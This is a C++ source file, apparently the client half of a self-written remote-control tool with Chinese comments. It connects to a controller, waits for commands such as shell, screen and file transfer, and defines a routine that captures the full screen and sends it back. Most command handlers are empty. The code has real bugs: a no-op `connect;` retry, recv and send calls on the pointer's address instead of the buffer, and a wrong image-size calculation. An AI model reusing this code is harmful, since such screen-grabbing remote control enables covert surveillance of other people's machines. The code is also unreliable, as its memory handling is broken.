#include<iostream>
#include"../common/CSockinit.h"
#include"../common/proto.h"

using namespace std;
//c2r controller ->remote  控制端发送给被控端的包


bool RecvPackage(IN SOCKET sock, OUT PackageHead& hdr, OUT LPBYTE& pDataBuf);
bool SendPackage(IN SOCKET sock, IN PackageHead& hdr, IN LPBYTE pDataBuf);
void OnC2RScreen(IN SOCKET sock);

int main()
{
	/*创建套接字*/
	SOCKET sock = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		cout << "创建套接字失败";
		return 0;
	}

	sockaddr_in si;
	si.sin_family = AF_INET;
	si.sin_port = htons(0x2710);//大尾转小尾，本机字节序转网络字节序
	si.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");


	int nRet = connect(sock, (sockaddr*)&si, sizeof(si));//连接

	if (nRet == SOCKET_ERROR)
	{
		cout << "sock connect err";
		return 0;
	}

	while (true)
	{
		//接受控制端的命令
		PackageHead hdr;
		LPBYTE pDataBuf = NULL;
		if (!RecvPackage(sock, hdr, pDataBuf))
		{
			//接受失败
			connect;
		}
		//处理命令
		switch (hdr.m_command)
		{
		case C2R_CMD:
			break;
		case C2R_SCREEN:
			break;
		case C2R_FILETRAVELS:
			break;
		case C2R_FILEUPLOAD:
			break;
		case R2C_SCREEN:

			break;
		default:
			break;
		}
	}

	return 0;
}

bool RecvPackage(IN SOCKET sock, OUT PackageHead& hdr, OUT LPBYTE& pDataBuf)
{
	//收包头 如果本地可以直接收4个DWORD长度，但是如果远程的话，可能一次性收不到DWORD，所以这里循环收包
	int nRecvLen = 0;			//收到的包头长度
	DWORD dwDataLen;			//包的数据长度
	while (nRecvLen < sizeof(DWORD))
	{
		int nRet = recv(sock, (char*)&dwDataLen + nRecvLen, sizeof(dwDataLen) - nRecvLen, 0);
		nRecvLen += nRet;
	}
	hdr.m_dwDataLen = dwDataLen;




	//申请数据缓冲区
	if (hdr.m_dwDataLen == 0)
	{
		return TRUE;
	}

	pDataBuf = new BYTE[hdr.m_dwDataLen];
	if (pDataBuf == NULL)
	{
		return false;
	}

	//收数据
	nRecvLen = 0;
	while (nRecvLen < hdr.m_dwDataLen)//如果接收的数据小于包头标明的长度
	{
		int nRet = recv(sock, (char*)&pDataBuf + nRecvLen, hdr.m_dwDataLen - nRecvLen, 0);
		if (nRet == SOCKET_ERROR || nRet == 0)
		{
			delete[] pDataBuf;
			return false;
		}
		nRecvLen += nRet;
	}
	return true;
}

bool SendPackage(IN SOCKET sock, IN const PackageHead& hdr, IN LPBYTE pDataBuf)
{
	//发送包头
	int nRet = send(sock, (char*)&hdr, sizeof(hdr), 0);
	if (nRet == SOCKET_ERROR)
	{
		return false;
	}


	//发送数据
	nRet = send(sock, (char*)&pDataBuf, hdr.m_dwDataLen, 0);
	if (nRet == SOCKET_ERROR)
	{
		return false;
	}
	return true;
}
void OnC2RScreen(IN SOCKET sock)
{
	//获取屏幕DC
	HDC hdcScreen = GetWindowDC(NULL);
	DWORD dwScreenWith = GetSystemMetrics(SM_CXSCREEN);//获取屏幕宽
	DWORD dwScreenHeigth = GetSystemMetrics(SM_CYSCREEN);//获取屏幕高


	//将屏幕数据拷贝到兼容DC中
	HDC hDcMem = CreateCompatibleDC(hdcScreen);
	HBITMAP HBmp = CreateCompatibleBitmap(hdcScreen, dwScreenWith, dwScreenHeigth);
	SelectObject(hDcMem, HBmp);
	BitBlt(hDcMem, 0, 0, dwScreenWith, dwScreenHeigth, hdcScreen, 0, 0, SRCCOPY);

	//获取位图数据
	DWORD dwBitsOfPixel = GetDeviceCaps(hDcMem, BITSPIXEL) / 8;
	DWORD dwBufSize = dwBitsOfPixel * dwScreenWith * dwBitsOfPixel * dwScreenHeigth;
	LPBYTE pBuf = new BYTE[dwBufSize];
	if (pBuf == NULL)
	{
		return;
	}
	memset(pBuf, 0, dwBufSize);

	GetBitmapBits(HBmp, dwBufSize, pBuf);
	//发送到控制端

	SendPackage(sock, PackageHead{ R2C_SCREEN,dwBufSize }, pBuf);

	//释放
	delete[]pBuf;
	DeleteObject(HBmp);
	DeleteDC(hDcMem);
	ReleaseDC(NULL, hdcScreen);
}